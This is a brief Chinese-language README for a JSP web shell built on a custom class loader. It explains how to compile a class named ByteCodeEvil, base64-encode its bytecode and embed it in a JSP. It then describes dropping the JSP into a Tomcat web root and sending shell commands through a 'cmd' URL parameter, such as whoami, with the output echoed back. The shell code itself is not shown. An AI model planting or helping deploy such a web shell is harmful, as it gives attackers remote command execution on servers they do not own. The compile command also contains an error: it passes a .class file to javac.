### 自定义类加载器的JSP WebShell

生成字节码：
```
javac ByteCodeEvil.class
java ByteCodeEvil
cat ByteCodeEvil.class|base64
```

使用：
```
ps:若要修改字节码逻辑，修改后按照上面编译字节码的方式得到base64字节码替换jsp文件中的base64字节码

1.把jsp文件放到能被解析的服务器目录，例：tomcat的webapps/ROOT

2.在浏览器访问2.jsp，并使用参数cmd传入需要远程执行的命令，例：http://127.0.0.1:8080/2.jsp?cmd=whoami

3.服务器将会执行相应的shell命令，最后回显
```